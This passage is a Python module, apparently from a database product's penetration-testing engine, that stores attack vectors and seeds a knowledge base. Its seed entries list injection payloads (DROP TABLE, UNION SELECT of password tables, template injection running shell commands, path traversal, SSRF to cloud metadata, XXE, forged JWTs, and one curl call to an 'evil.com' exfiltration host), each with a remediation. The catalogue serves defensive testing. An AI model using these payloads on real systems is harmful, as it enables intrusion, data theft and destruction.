"""
CortexDB Sentinel — Attack Knowledge Base
==========================================
Stores attack vectors, threat intelligence, and remediation guidance
used by the Sentinel penetration testing engine.
"""

from __future__ import annotations

import json
import logging
import time
import uuid
from datetime import datetime, timezone
from typing import Any, Dict, List, Optional, TYPE_CHECKING

if TYPE_CHECKING:
    from cortexdb.superadmin.persistence import PersistenceStore

logger = logging.getLogger("cortexdb.sentinel.knowledge_base")


class AttackKnowledgeBase:
    """Manages attack vectors, threat intel, and remediation data via SQLite."""

    def __init__(self, persistence_store: "PersistenceStore"):
        self._persistence = persistence_store
        self._init_db()

    # ── Schema ──────────────────────────────────────────────────────────────

    def _init_db(self) -> None:
        # Tables 'sentinel_kb' and 'sentinel_threat_intel' are managed by the
        # SQLite migration system (see migrations.py v6). No-op.
        pass

    # ── Helpers ─────────────────────────────────────────────────────────────

    _KB_COLS = (
        "id, attack_id, category, name, description, severity, "
        "framework, framework_id, payloads, indicators, remediation, enabled, created_at"
    )

    def _row_to_vector(self, row) -> dict:
        return {
            "id": row[0],
            "attack_id": row[1],
            "category": row[2],
            "name": row[3],
            "description": row[4],
            "severity": row[5],
            "framework": row[6],
            "framework_id": row[7],
            "payloads": json.loads(row[8]) if row[8] else [],
            "indicators": json.loads(row[9]) if row[9] else {},
            "remediation": row[10],
            "enabled": bool(row[11]),
            "created_at": row[12],
        }

    _TI_COLS = (
        "id, intel_id, source, cve_id, title, description, severity, "
        "affected_component, applicable, mitigation, created_at"
    )

    def _row_to_intel(self, row) -> dict:
        return {
            "id": row[0],
            "intel_id": row[1],
            "source": row[2],
            "cve_id": row[3],
            "title": row[4],
            "description": row[5],
            "severity": row[6],
            "affected_component": row[7],
            "applicable": bool(row[8]),
            "mitigation": row[9],
            "created_at": row[10],
        }

    # ── Attack Vector CRUD ─────────────────────────────────────────────────

    def list_vectors(
        self,
        category: Optional[str] = None,
        severity: Optional[str] = None,
        enabled_only: bool = True,
    ) -> List[dict]:
        """Return attack vectors, optionally filtered by category/severity."""
        sql = f"SELECT {self._KB_COLS} FROM sentinel_kb WHERE 1=1"
        params: list = []
        if enabled_only:
            sql += " AND enabled = 1"
        if category:
            sql += " AND category = ?"
            params.append(category)
        if severity:
            sql += " AND severity = ?"
            params.append(severity)
        sql += " ORDER BY category, severity DESC, attack_id"
        rows = self._persistence.conn.execute(sql, params).fetchall()
        return [self._row_to_vector(r) for r in rows]

    def get_vector(self, attack_id: str) -> Optional[dict]:
        """Return a single attack vector by its attack_id."""
        row = self._persistence.conn.execute(
            f"SELECT {self._KB_COLS} FROM sentinel_kb WHERE attack_id = ?",
            (attack_id,),
        ).fetchone()
        if not row:
            return None
        return self._row_to_vector(row)

    def add_vector(self, vector: Dict[str, Any]) -> dict:
        """Insert a new attack vector. Returns the created record."""
        now = datetime.now(timezone.utc).isoformat()
        attack_id = vector.get("attack_id", f"ATK-{uuid.uuid4().hex[:8]}")
        self._persistence.conn.execute(
            "INSERT OR IGNORE INTO sentinel_kb "
            "(attack_id, category, name, description, severity, framework, "
            "framework_id, payloads, indicators, remediation, enabled, created_at) "
            "VALUES (?,?,?,?,?,?,?,?,?,?,?,?)",
            (
                attack_id,
                vector.get("category", "unknown"),
                vector.get("name", ""),
                vector.get("description", ""),
                vector.get("severity", "medium"),
                vector.get("framework", ""),
                vector.get("framework_id", ""),
                json.dumps(vector.get("payloads", [])),
                json.dumps(vector.get("indicators", {})),
                vector.get("remediation", ""),
                1 if vector.get("enabled", True) else 0,
                now,
            ),
        )
        self._persistence.conn.commit()
        return self.get_vector(attack_id) or {"attack_id": attack_id, "status": "inserted"}

    def update_vector(self, attack_id: str, updates: Dict[str, Any]) -> Optional[dict]:
        """Update fields on an existing attack vector."""
        existing = self.get_vector(attack_id)
        if not existing:
            return None
        allowed = {
            "category", "name", "description", "severity", "framework",
            "framework_id", "payloads", "indicators", "remediation", "enabled",
        }
        sets, params = [], []
        for key, val in updates.items():
            if key not in allowed:
                continue
            if key == "payloads":
                val = json.dumps(val)
            elif key == "indicators":
                val = json.dumps(val)
            elif key == "enabled":
                val = 1 if val else 0
            sets.append(f"{key} = ?")
            params.append(val)
        if not sets:
            return existing
        params.append(attack_id)
        self._persistence.conn.execute(
            f"UPDATE sentinel_kb SET {', '.join(sets)} WHERE attack_id = ?", params
        )
        self._persistence.conn.commit()
        return self.get_vector(attack_id)

    # ── Threat Intelligence ────────────────────────────────────────────────

    def add_threat_intel(self, intel: Dict[str, Any]) -> dict:
        """Insert a threat intelligence entry."""
        now = datetime.now(timezone.utc).isoformat()
        intel_id = intel.get("intel_id", f"TI-{uuid.uuid4().hex[:8]}")
        self._persistence.conn.execute(
            "INSERT OR IGNORE INTO sentinel_threat_intel "
            "(intel_id, source, cve_id, title, description, severity, "
            "affected_component, applicable, mitigation, created_at) "
            "VALUES (?,?,?,?,?,?,?,?,?,?)",
            (
                intel_id,
                intel.get("source", ""),
                intel.get("cve_id", ""),
                intel.get("title", ""),
                intel.get("description", ""),
                intel.get("severity", "medium"),
                intel.get("affected_component", ""),
                1 if intel.get("applicable", False) else 0,
                intel.get("mitigation", ""),
                now,
            ),
        )
        self._persistence.conn.commit()
        row = self._persistence.conn.execute(
            f"SELECT {self._TI_COLS} FROM sentinel_threat_intel WHERE intel_id = ?",
            (intel_id,),
        ).fetchone()
        return self._row_to_intel(row) if row else {"intel_id": intel_id, "status": "inserted"}

    def list_threat_intel(
        self,
        severity: Optional[str] = None,
        component: Optional[str] = None,
        applicable_only: bool = False,
    ) -> List[dict]:
        """Return threat intelligence entries with optional filters."""
        sql = f"SELECT {self._TI_COLS} FROM sentinel_threat_intel WHERE 1=1"
        params: list = []
        if severity:
            sql += " AND severity = ?"
            params.append(severity)
        if component:
            sql += " AND affected_component = ?"
            params.append(component)
        if applicable_only:
            sql += " AND applicable = 1"
        sql += " ORDER BY severity DESC, created_at DESC"
        rows = self._persistence.conn.execute(sql, params).fetchall()
        return [self._row_to_intel(r) for r in rows]

    # ── Statistics ─────────────────────────────────────────────────────────

    def get_category_stats(self) -> Dict[str, Any]:
        """Return vector counts grouped by category and severity."""
        conn = self._persistence.conn
        total = conn.execute("SELECT COUNT(*) FROM sentinel_kb").fetchone()[0]
        enabled = conn.execute("SELECT COUNT(*) FROM sentinel_kb WHERE enabled = 1").fetchone()[0]

        by_category = {}
        rows = conn.execute(
            "SELECT category, COUNT(*) FROM sentinel_kb GROUP BY category ORDER BY category"
        ).fetchall()
        for cat, cnt in rows:
            by_category[cat] = cnt

        by_severity = {}
        rows = conn.execute(
            "SELECT severity, COUNT(*) FROM sentinel_kb GROUP BY severity ORDER BY severity"
        ).fetchall()
        for sev, cnt in rows:
            by_severity[sev] = cnt

        intel_total = conn.execute("SELECT COUNT(*) FROM sentinel_threat_intel").fetchone()[0]
        intel_applicable = conn.execute(
            "SELECT COUNT(*) FROM sentinel_threat_intel WHERE applicable = 1"
        ).fetchone()[0]

        return {
            "vectors": {
                "total": total,
                "enabled": enabled,
                "disabled": total - enabled,
                "by_category": by_category,
                "by_severity": by_severity,
            },
            "threat_intel": {
                "total": intel_total,
                "applicable": intel_applicable,
            },
        }

    # ── Seed Knowledge Base ────────────────────────────────────────────────

    def seed_knowledge_base(self) -> int:
        """
        Populate the knowledge base with real attack vectors across all 12 categories.
        Uses INSERT OR IGNORE for idempotency. Returns the number of vectors inserted.
        """
        vectors = [
            # ── 1. sql_injection (10) ──────────────────────────────────────
            {"attack_id": "SQLi-001", "category": "sql_injection", "name": "Classic OR-based bypass", "severity": "critical", "description": "Tautology-based authentication bypass using OR '1'='1' to make WHERE clause always true.", "framework": "OWASP", "framework_id": "A03:2021", "payloads": ["' OR '1'='1", "' OR ''='", "1 OR 1=1; --", "' OR 1=1--"], "indicators": {"vulnerable_if": {"status_code_in": [200], "body_contains": ["rows", "data", "customer"]}}, "remediation": "Use parameterized queries exclusively. Never interpolate user input into SQL strings."},
            {"attack_id": "SQLi-002", "category": "sql_injection", "name": "DROP TABLE destructive injection", "severity": "critical", "description": "Stacked query injection attempting to drop database tables via appended DROP TABLE statement.", "framework": "OWASP", "framework_id": "A03:2021", "payloads": ["'; DROP TABLE customers;--", "'; DROP TABLE blocks;--", "$$; DROP TABLE blocks;$$"], "indicators": {"vulnerable_if": {"status_code_in": [200, 500], "body_contains": ["error", "relation", "does not exist"]}}, "remediation": "Disable stacked queries. Use parameterized queries and least-privilege DB accounts without DROP permissions."},
            {"attack_id": "SQLi-003", "category": "sql_injection", "name": "UNION SELECT data exfiltration", "severity": "critical", "description": "UNION-based injection to extract data from other tables by appending SELECT from system or user tables.", "framework": "OWASP", "framework_id": "A03:2021", "payloads": ["1 UNION SELECT null,username,password FROM users--", "' UNION ALL SELECT NULL,NULL,version()--", "' UNION SELECT password FROM pg_shadow--", "' UNION ALL SELECT NULL,NULL,NULL--"], "indicators": {"vulnerable_if": {"status_code_in": [200], "body_contains": ["password", "pg_shadow", "version", "PostgreSQL"]}}, "remediation": "Use parameterized queries. Restrict DB user privileges so UNION SELECTs against system tables fail."},
            {"attack_id": "SQLi-004", "category": "sql_injection", "name": "Time-based blind injection", "severity": "high", "description": "Blind SQL injection using time delays (WAITFOR DELAY, pg_sleep, SLEEP) to infer data one bit at a time.", "framework": "OWASP", "framework_id": "A03:2021", "payloads": ["1; WAITFOR DELAY '0:0:5'--", "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", "1; SELECT pg_sleep(5)--", "'; SELECT pg_sleep(5);--"], "indicators": {"vulnerable_if": {"timing_ms_gt": 5000}}, "remediation": "Use parameterized queries. Set query timeouts. Monitor for anomalous query durations."},
            {"attack_id": "SQLi-005", "category": "sql_injection", "name": "CortexQL STORE injection", "severity": "high", "description": "Injection through CortexDB-specific STORE INTO syntax to write data to system tables.", "framework": "CortexDB", "framework_id": "CDB-SQLi-001", "payloads": ["STORE INTO system_tables", "STORE INTO zt_policies VALUES ('evil','allow')", "STORE INTO sentinel_kb VALUES ('backdoor')"], "indicators": {"vulnerable_if": {"status_code_in": [200], "body_contains": ["stored", "inserted", "success"]}}, "remediation": "The Amygdala layer must validate STORE targets against an allowlist of writable tables."},
            {"attack_id": "SQLi-006", "category": "sql_injection", "name": "Hex-encoded injection bypass", "severity": "high", "description": "Using hex or URL encoding to bypass input filters that check for literal quote characters.", "framework": "OWASP", "framework_id": "A03:2021", "payloads": ["\\x27 OR 1=1", "%27%20OR%201%3D1--", "0x27204F5220313D31", "CHAR(39)||'OR 1=1--'"], "indicators": {"vulnerable_if": {"status_code_in": [200], "body_contains": ["rows", "data"]}}, "remediation": "Decode all input encodings before validation. Use parameterized queries that are encoding-agnostic."},
            {"attack_id": "SQLi-007", "category": "sql_injection", "name": "Comment-based filter bypass", "severity": "medium", "description": "Using SQL comments (/**/, --, #) to break up keywords and evade pattern-matching WAFs.", "framework": "OWASP", "framework_id": "A03:2021", "payloads": ["admin'--", "admin'/**/OR/**/1=1--", "' OR/**/1=1#", "';/**/DROP/**/TABLE/**/users;--"], "indicators": {"vulnerable_if": {"status_code_in": [200], "body_contains": ["admin", "rows"]}}, "remediation": "Do not rely on pattern matching for SQL injection prevention. Use parameterized queries."},
            {"attack_id": "SQLi-008", "category": "sql_injection", "name": "Second-order injection", "severity": "high", "description": "Malicious payload stored in DB via one operation, then executed when retrieved and used in a subsequent query.", "framework": "OWASP", "framework_id": "A03:2021", "payloads": ["INSERT INTO events (data) VALUES ('{\"name\": \"'; DROP TABLE customers;--\"}')", "UPDATE profiles SET bio = ''' OR 1=1--' WHERE id = 1"], "indicators": {"vulnerable_if": {"status_code_in": [500], "body_contains": ["syntax error", "relation", "does not exist"]}}, "remediation": "Parameterize all queries including those using previously-stored data. Treat all DB values as untrusted."},
            {"attack_id": "SQLi-009", "category": "sql_injection", "name": "ORDER BY column enumeration", "severity": "medium", "description": "Using ORDER BY with incrementing column indices to determine table column count for UNION injection.", "framework": "OWASP", "framework_id": "A03:2021", "payloads": ["1' ORDER BY 1--", "1' ORDER BY 5--", "1' ORDER BY 100--", "' HAVING 1=1--", "' GROUP BY 1 HAVING 1=1--"], "indicators": {"vulnerable_if": {"status_code_in": [200, 500], "body_contains": ["ORDER BY", "column", "position"]}}, "remediation": "Whitelist allowed sort columns. Never pass user input directly to ORDER BY clause."},
            {"attack_id": "SQLi-010", "category": "sql_injection", "name": "Privilege escalation via ALTER", "severity": "critical", "description": "Injecting ALTER USER or GRANT statements to escalate database privileges.", "framework": "OWASP", "framework_id": "A03:2021", "payloads": ["'; ALTER USER cortex WITH SUPERUSER;--", "'; GRANT ALL ON ALL TABLES TO public;--", "'; COPY (SELECT '') TO '/tmp/pwned';--"], "indicators": {"vulnerable_if": {"status_code_in": [200], "body_contains": ["ALTER", "GRANT", "success"]}}, "remediation": "Use least-privilege DB accounts. Disable dangerous statements via pg_hba.conf and role restrictions."},

            # ── 2. auth_session (10) ───────────────────────────────────────
            {"attack_id": "AUTH-001", "category": "auth_session", "name": "Empty bearer token", "severity": "high", "description": "Sending an Authorization header with an empty Bearer value to bypass token presence checks.", "framework": "OWASP", "framework_id": "A07:2021", "payloads": ["Authorization: Bearer ", "Authorization: Bearer  ", "Authorization: Bearer\t"], "indicators": {"protected_if": {"status_code_in": [401, 403]}}, "remediation": "Validate that the bearer token is non-empty and meets minimum length requirements after trimming."},
            {"attack_id": "AUTH-002", "category": "auth_session", "name": "Invalid bearer token format", "severity": "high", "description": "Sending malformed or obviously invalid tokens to test token validation strictness.", "framework": "OWASP", "framework_id": "A07:2021", "payloads": ["Bearer invalid", "Bearer null", "Bearer undefined", "Bearer {{template}}"], "indicators": {"protected_if": {"status_code_in": [401, 403]}}, "remediation": "Validate token format (JWT structure, length, character set) before attempting verification."},
            {"attack_id": "AUTH-003", "category": "auth_session", "name": "Expired JWT replay", "severity": "high", "description": "Replaying a JWT token whose exp claim is in the past to test expiration enforcement.", "framework": "OWASP", "framework_id": "A07:2021", "payloads": ["Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwiZXhwIjoxMDAwMDAwMDAwfQ.invalid"], "indicators": {"protected_if": {"status_code_in": [401, 403]}}, "remediation": "Always validate exp claim. Use short-lived tokens with refresh token rotation."},
            {"attack_id": "AUTH-004", "category": "auth_session", "name": "Admin token in tenant header", "severity": "critical", "description": "Placing an admin-level token value into the X-Tenant-Key header to gain elevated access.", "framework": "OWASP", "framework_id": "A01:2021", "payloads": ["X-Tenant-Key: admin_token_value", "X-Tenant-Key: __admin__", "X-Tenant-Key: superadmin"], "indicators": {"protected_if": {"status_code_in": [401, 403]}}, "remediation": "Tenant key and admin token must be validated through separate code paths. Never cross-reference headers."},
            {"attack_id": "AUTH-005", "category": "auth_session", "name": "Session fixation via token reuse", "severity": "high", "description": "Reusing a previously valid session token after logout to test session invalidation.", "framework": "OWASP", "framework_id": "A07:2021", "payloads": ["Reuse token from previous session after logout", "Present pre-authentication token post-login"], "indicators": {"protected_if": {"status_code_in": [401, 403]}}, "remediation": "Invalidate tokens on logout. Maintain a server-side deny-list of revoked tokens until expiry."},
            {"attack_id": "AUTH-006", "category": "auth_session", "name": "Basic auth credential stuffing", "severity": "medium", "description": "Attempting HTTP Basic authentication with common default credentials.", "framework": "OWASP", "framework_id": "A07:2021", "payloads": ["Authorization: Basic dGVzdDp0ZXN0", "Authorization: Basic YWRtaW46YWRtaW4=", "Authorization: Basic YWRtaW46cGFzc3dvcmQ="], "indicators": {"protected_if": {"status_code_in": [401, 403]}}, "remediation": "Disable Basic auth. If required, enforce strong passwords and rate-limit authentication attempts."},
            {"attack_id": "AUTH-007", "category": "auth_session", "name": "Missing auth header entirely", "severity": "high", "description": "Sending requests without any Authorization header to verify auth is enforced by default.", "framework": "OWASP", "framework_id": "A07:2021", "payloads": ["(no Authorization header)", "(no X-Tenant-Key header)", "(empty headers)"], "indicators": {"protected_if": {"status_code_in": [401, 403]}}, "remediation": "Apply authentication middleware globally. Explicitly whitelist only public endpoints."},
            {"attack_id": "AUTH-008", "category": "auth_session", "name": "Token with leading/trailing whitespace", "severity": "low", "description": "Adding extra whitespace around token value to test trimming behavior in auth parsing.", "framework": "OWASP", "framework_id": "A07:2021", "payloads": ["Bearer  valid_token_here  ", "Bearer \ttoken\t", "Bearer \ntoken"], "indicators": {"protected_if": {"status_code_in": [401, 403]}}, "remediation": "Trim whitespace from token values but validate the trimmed result strictly."},
            {"attack_id": "AUTH-009", "category": "auth_session", "name": "JWT algorithm confusion (none)", "severity": "critical", "description": "Modifying JWT header to alg:none to bypass signature verification.", "framework": "OWASP", "framework_id": "A02:2021", "payloads": ["Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJzdXBlcmFkbWluIn0.", "Bearer eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ."], "indicators": {"protected_if": {"status_code_in": [401, 403]}}, "remediation": "Explicitly whitelist allowed JWT algorithms. Reject tokens with alg:none or alg:None."},
            {"attack_id": "AUTH-010", "category": "auth_session", "name": "Oversized token DoS", "severity": "medium", "description": "Sending an extremely large token value to test header size limits and memory handling.", "framework": "OWASP", "framework_id": "A07:2021", "payloads": ["Bearer " + "A" * 100000], "indicators": {"protected_if": {"status_code_in": [400, 401, 403, 413, 431]}}, "remediation": "Enforce maximum header size limits at the reverse proxy and application level."},

            # ── 3. authz_privesc (10) ──────────────────────────────────────
            {"attack_id": "AUTHZ-001", "category": "authz_privesc", "name": "Access admin routes without admin token", "severity": "critical", "description": "Requesting /admin/* endpoints with a regular user or tenant token instead of the required admin token.", "framework": "OWASP", "framework_id": "A01:2021", "payloads": ["GET /v1/admin/tenants with tenant-key only", "GET /admin/cache/stats without X-Admin-Token", "GET /v1/admin/sharding/status with user bearer"], "indicators": {"protected_if": {"status_code_in": [401, 403]}}, "remediation": "Enforce admin role check on all /admin/* routes. Use middleware that verifies the X-Admin-Token header."},
            {"attack_id": "AUTHZ-002", "category": "authz_privesc", "name": "Access superadmin without session", "severity": "critical", "description": "Requesting /v1/superadmin/* endpoints without an authenticated superadmin session.", "framework": "OWASP", "framework_id": "A01:2021", "payloads": ["GET /v1/superadmin/dashboard", "POST /v1/superadmin/settings", "GET /v1/superadmin/audit"], "indicators": {"protected_if": {"status_code_in": [401, 403]}}, "remediation": "Require authenticated superadmin session for all /superadmin/* routes. Verify session token on every request."},
            {"attack_id": "AUTHZ-003", "category": "authz_privesc", "name": "Tenant A accessing tenant B data", "severity": "critical", "description": "Cross-tenant data access by manipulating tenant context in queries or headers.", "framework": "OWASP", "framework_id": "A01:2021", "payloads": ["X-Tenant-Key: other-tenant with valid auth", "Query with tenant_id = 'other-tenant-id'", "Cross-tenant customer ID in URL path"], "indicators": {"protected_if": {"status_code_in": [401, 403, 404]}}, "remediation": "Enforce row-level security (RLS) at the database level. Inject tenant_id from verified session, never from user input."},
            {"attack_id": "AUTHZ-004", "category": "authz_privesc", "name": "Regular user accessing admin tenant list", "severity": "high", "description": "Non-admin user attempting to enumerate tenants via /v1/admin/tenants.", "framework": "OWASP", "framework_id": "A01:2021", "payloads": ["GET /v1/admin/tenants with regular Bearer token", "GET /v1/admin/tenants with X-Tenant-Key only"], "indicators": {"protected_if": {"status_code_in": [401, 403]}}, "remediation": "Enforce RBAC on admin endpoints. Only admin-role tokens should access tenant management."},
            {"attack_id": "AUTHZ-005", "category": "authz_privesc", "name": "PUT to read-only endpoint", "severity": "medium", "description": "Sending PUT/POST/DELETE requests to endpoints intended to be read-only.", "framework": "OWASP", "framework_id": "A01:2021", "payloads": ["PUT /v1/blocks with modification payload", "DELETE /v1/blocks/block-id on read-only route", "POST /health/live with body"], "indicators": {"protected_if": {"status_code_in": [401, 403, 405]}}, "remediation": "Enforce HTTP method restrictions per route. Return 405 Method Not Allowed for unsupported verbs."},
            {"attack_id": "AUTHZ-006", "category": "authz_privesc", "name": "DELETE without permission", "severity": "high", "description": "Issuing DELETE requests against resources without sufficient delete permissions.", "framework": "OWASP", "framework_id": "A01:2021", "payloads": ["DELETE /v1/admin/tenants/victim-tenant/purge", "DELETE /v1/blocks/important-block-id", "DELETE /v1/agents/agent-id"], "indicators": {"protected_if": {"status_code_in": [401, 403]}}, "remediation": "Require explicit delete permission. Log all delete attempts for audit."},
            {"attack_id": "AUTHZ-007", "category": "authz_privesc", "name": "Cross-tenant export access", "severity": "critical", "description": "Attempting to export another tenant's data by manipulating the tenant ID in export endpoint paths.", "framework": "OWASP", "framework_id": "A01:2021", "payloads": ["POST /v1/admin/tenants/other-tenant-id/export", "GET /v1/admin/tenants/victim/export?format=csv"], "indicators": {"protected_if": {"status_code_in": [401, 403]}}, "remediation": "Validate that the authenticated user owns or administrates the target tenant before allowing export."},
            {"attack_id": "AUTHZ-008", "category": "authz_privesc", "name": "Admin token header manipulation", "severity": "high", "description": "Injecting or modifying the admin_token header to escalate from regular user to admin.", "framework": "OWASP", "framework_id": "A01:2021", "payloads": ["X-Admin-Token: ' OR '1'='1", "X-Admin-Token: admin", "X-Admin-Token: true"], "indicators": {"protected_if": {"status_code_in": [401, 403]}}, "remediation": "Admin tokens must be cryptographically random and verified against a secure store. Reject trivial values."},
            {"attack_id": "AUTHZ-009", "category": "authz_privesc", "name": "Superadmin escalation via header", "severity": "critical", "description": "Attempting to reach superadmin privileges by setting role or privilege headers.", "framework": "OWASP", "framework_id": "A01:2021", "payloads": ["X-Role: superadmin", "X-Privilege-Level: root", "X-User-Role: admin combined with tenant key"], "indicators": {"protected_if": {"status_code_in": [401, 403]}}, "remediation": "Never trust client-supplied role headers. Derive roles exclusively from verified tokens or server-side sessions."},
            {"attack_id": "AUTHZ-010", "category": "authz_privesc", "name": "Cache clear without admin auth", "severity": "high", "description": "Attempting to clear the application cache via /v1/admin/cache/clear without proper admin authentication.", "framework": "OWASP", "framework_id": "A01:2021", "payloads": ["POST /v1/admin/cache/clear with tenant-key only", "DELETE /admin/cache with no auth", "POST /v1/admin/cache/clear with regular Bearer"], "indicators": {"protected_if": {"status_code_in": [401, 403]}}, "remediation": "Protect all destructive admin operations behind admin-only middleware."},

            # ── 4. input_validation (10) ───────────────────────────────────
            {"attack_id": "INPUT-001", "category": "input_validation", "name": "Reflected XSS via script tag", "severity": "high", "description": "Injecting script tags in input fields to test for reflected cross-site scripting in API responses.", "framework": "OWASP", "framework_id": "A03:2021", "payloads": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg/onload=alert(1)>", "javascript:alert(1)"], "indicators": {"vulnerable_if": {"status_code_in": [200], "body_contains": ["<script>", "onerror=", "onload="]}}, "remediation": "Sanitize and HTML-encode all output. Set Content-Type: application/json to prevent browser interpretation."},
            {"attack_id": "INPUT-002", "category": "input_validation", "name": "Server-Side Template Injection", "severity": "critical", "description": "Injecting template expressions to test for SSTI in Jinja2, Mako, or other template engines.", "framework": "OWASP", "framework_id": "A03:2021", "payloads": ["{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>", "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"], "indicators": {"vulnerable_if": {"status_code_in": [200], "body_contains": ["49", "uid=", "config"]}}, "remediation": "Never render user input through template engines. Use strict auto-escaping and sandboxed templates."},
            {"attack_id": "INPUT-003", "category": "input_validation", "name": "Path traversal", "severity": "critical", "description": "Directory traversal using ../ sequences to access files outside the intended directory.", "framework": "OWASP", "framework_id": "A01:2021", "payloads": ["../../../etc/passwd", "..\\..\\..\\windows\\system32\\config\\sam", "%2e%2e%2f%2e%2e%2fetc%2fpasswd", "....//....//etc/passwd"], "indicators": {"vulnerable_if": {"status_code_in": [200], "body_contains": ["root:", "daemon:", "[boot loader]"]}}, "remediation": "Validate and canonicalize paths. Use chroot or allowlist-based path resolution."},
            {"attack_id": "INPUT-004", "category": "input_validation", "name": "Null byte injection", "severity": "medium", "description": "Inserting null bytes to truncate strings or bypass extension checks in file operations.", "framework": "OWASP", "framework_id": "A03:2021", "payloads": ["\x00nullbyte", "test%00admin", "file.txt\x00.jpg", "admin\x00"], "indicators": {"vulnerable_if": {"status_code_in": [500], "body_contains": ["error", "null", "invalid"]}}, "remediation": "Strip or reject null bytes from all input. Modern languages handle this but C-based extensions may not."},
            {"attack_id": "INPUT-005", "category": "input_validation", "name": "Oversized payload", "severity": "medium", "description": "Sending payloads exceeding expected size limits to test for buffer overflows or resource exhaustion.", "framework": "OWASP", "framework_id": "A05:2021", "payloads": ["A" * 1048576], "indicators": {"protected_if": {"status_code_in": [400, 413, 422]}}, "remediation": "Enforce strict Content-Length limits at reverse proxy and application level. Reject payloads over threshold."},
            {"attack_id": "INPUT-006", "category": "input_validation", "name": "Unicode normalization bypass", "severity": "medium", "description": "Using Unicode characters that normalize to ASCII equivalents to bypass input filters.", "framework": "OWASP", "framework_id": "A03:2021", "payloads": ["\ufb01le", "\u0027 OR 1=1--", "\uff07 OR 1=1--", "admin\u200b", "\u02bc OR 1=1--"], "indicators": {"vulnerable_if": {"status_code_in": [200], "body_contains": ["rows", "data", "admin"]}}, "remediation": "Normalize all Unicode input to NFC/NFKC form before validation. Apply security checks post-normalization."},
            {"attack_id": "INPUT-007", "category": "input_validation", "name": "JSON operator injection", "severity": "high", "description": "Injecting NoSQL-style operators in JSON payloads to manipulate query logic.", "framework": "OWASP", "framework_id": "A03:2021", "payloads": ["{\"$ne\": null}", "{\"$gt\": \"\"}", "{\"$regex\": \".*\"}", "{\"$where\": \"this.admin==true\"}"], "indicators": {"protected_if": {"status_code_in": [400, 422]}}, "remediation": "Validate JSON schema strictly. Reject payloads containing operator-like keys ($ne, $gt, $where)."},
            {"attack_id": "INPUT-008", "category": "input_validation", "name": "SSRF via URL parameter", "severity": "critical", "description": "Server-Side Request Forgery attempting to reach internal services or cloud metadata endpoints.", "framework": "OWASP", "framework_id": "A10:2021", "payloads": ["http://169.254.169.254/latest/meta-data/", "http://127.0.0.1:6379/INFO", "http://[::1]:5432/", "http://metadata.google.internal/computeMetadata/v1/"], "indicators": {"protected_if": {"status_code_in": [400, 403, 422]}}, "remediation": "Validate and whitelist outbound URLs. Block private IP ranges, link-local, and cloud metadata endpoints."},
            {"attack_id": "INPUT-009", "category": "input_validation", "name": "OS command injection", "severity": "critical", "description": "Injecting shell commands via input fields that may be passed to system exec functions.", "framework": "OWASP", "framework_id": "A03:2021", "payloads": ["; cat /etc/passwd", "| ls -la", "$(whoami)", "`id`", "&& curl http://evil.com/exfil"], "indicators": {"vulnerable_if": {"status_code_in": [200], "body_contains": ["root:", "uid=", "total "]}}, "remediation": "Never pass user input to shell commands. Use language-native APIs instead of exec/system calls."},
            {"attack_id": "INPUT-010", "category": "input_validation", "name": "XML External Entity (XXE)", "severity": "critical", "description": "Injecting XML with external entity declarations to read files or perform SSRF via XML parsers.", "framework": "OWASP", "framework_id": "A05:2021", "payloads": ["<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><root>&xxe;</root>", "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://169.254.169.254/'>]><root>&xxe;</root>", "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///etc/hostname\">]><foo>&xxe;</foo>"], "indicators": {"vulnerable_if": {"status_code_in": [200], "body_contains": ["root:", "daemon:", "ip-"]}}, "remediation": "Disable external entity processing in all XML parsers. Use JSON instead of XML where possible."},

            # ── 5. rate_limit_dos (8) ──────────────────────────────────────
            {"attack_id": "DOS-001", "category": "rate_limit_dos", "name": "Rapid request flood", "severity": "high", "description": "Sending 100+ requests per second to overwhelm the server and test rate limiting.", "framework": "OWASP", "framework_id": "A05:2021", "payloads": ["100 concurrent GET /health/live", "100 concurrent POST /v1/query", "100 concurrent GET /v1/blocks"], "indicators": {"protected_if": {"status_code_in": [429]}}, "remediation": "Implement rate limiting per IP and per API key. Use sliding window counters in Redis."},
            {"attack_id": "DOS-002", "category": "rate_limit_dos", "name": "Large payload body", "severity": "medium", "description": "Sending extremely large request bodies (10MB+) to exhaust memory and bandwidth.", "framework": "OWASP", "framework_id": "A05:2021", "payloads": ["POST body of 10MB of repeated 'A' characters", "POST with 10MB JSON array"], "indicators": {"protected_if": {"status_code_in": [400, 413]}}, "remediation": "Enforce request body size limits at the reverse proxy. Set max_content_length in the application."},
            {"attack_id": "DOS-003", "category": "rate_limit_dos", "name": "ReDoS pattern", "severity": "high", "description": "Regex denial of service via crafted input that causes catastrophic backtracking.", "framework": "OWASP", "framework_id": "A05:2021", "payloads": ["a]a]a]a]a]a]a]a]a]a]a]a]a]a]a]a]a]a]a]a]a]a]", "(a+)+$" + "a" * 50, "((a+)(b+))+$" + "aab" * 30], "indicators": {"vulnerable_if": {"timing_ms_gt": 5000}}, "remediation": "Use RE2 or other non-backtracking regex engines. Set timeout on regex operations."},
            {"attack_id": "DOS-004", "category": "rate_limit_dos", "name": "Slowloris attack", "severity": "medium", "description": "Opening connections and sending partial HTTP headers slowly to tie up server threads.", "framework": "CWE", "framework_id": "CWE-400", "payloads": ["Send partial HTTP request headers with 30s delays", "Open 100 connections and send 1 byte per 10s"], "indicators": {"protected_if": {"status_code_in": [408, 429]}}, "remediation": "Set aggressive request header timeouts. Use async I/O (uvicorn already handles this). Limit concurrent connections per IP."},
